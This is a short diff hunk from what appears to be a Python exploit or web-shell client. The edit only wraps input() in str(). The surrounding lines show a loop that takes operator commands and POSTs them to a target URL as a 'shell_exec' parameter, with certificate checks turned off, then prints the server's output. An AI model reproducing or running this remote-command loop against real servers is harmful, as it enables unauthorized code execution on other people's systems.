@@ -15,7 +15,7 @@ print("+------------------------------------------------------------------------
 
 while True:
     try:
-        command = input("# ")
+        command = str(input("# "))
         parameters = {"ctime": "shell_exec", "atime": str(command)}
         r = requests.post(target_url, data=parameters, verify=False)
         print(r.text)
